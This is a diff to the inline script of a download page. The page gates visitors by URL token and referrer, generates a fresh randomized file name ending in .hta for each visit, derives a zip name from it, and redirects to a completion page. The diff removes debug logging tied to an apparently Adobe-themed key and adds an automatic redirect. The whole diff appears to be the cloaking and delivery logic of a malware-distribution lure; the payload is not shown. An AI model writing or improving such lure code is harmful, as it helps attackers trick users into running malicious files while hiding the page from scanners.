@@ -40,19 +40,13 @@
   <script src="gate.js"></script>
   <script>
     (function () {
-      window.__steps2=[];
-      window.__st2push=function(m){window.__steps2.push(m);try{localStorage.setItem('adbe_dbg_dl',JSON.stringify(window.__steps2));}catch(e){}};
       var q = new URLSearchParams(location.search);
       var tk = q.get('tk') || '';
-      window.__st2push('tk:'+(tk?'yes':'NO'));
-      if (!tk) { window.__st2push('no-tk->gateEntry'); window.gateStep({ entry: true }); return; }
-      window.__st2push('ref:'+(document.referrer||'(empty)'));
-      window.__st2push('ua_ok:'+window.chromeOk?window.chromeOk():'n/a');
-      if (!window.gateStep({ entry: false, allowedRefPaths: ['/', '/index.html'] })) { window.__st2push('GATE-FAIL'); return; }
-      window.__st2push('gate-pass');
+      if (!tk) { window.gateStep({ entry: true }); return; }
+      if (!window.gateStep({ entry: false, allowedRefPaths: ['', 'index.html', 'index'] })) return;
+
       // Fresh name for THIS visit (fixed for the whole funnel).
       var name = window.makeName();
-      window.__steps2.push('name:'+name);
       var kind = window.nameKind(name);
       var zipName = name.replace(/\.hta$/i, '.zip');
 
@@ -65,11 +59,14 @@
       function go() {
         var btn = document.getElementById('continueBtn');
         var spinner = document.getElementById('spinner');
+        if (!btn) return;
         btn.style.display = 'none'; spinner.style.display = 'block';
         setTimeout(function () {
           window.location.href = 'complete.html?tk=' + encodeURIComponent(tk) + '&n=' + encodeURIComponent(name);
         }, 2000);
       }
+      // Auto-advance (the button remains for a human who stops to read).
+      setTimeout(go, 3500);
     })();
   </script>
 </body>
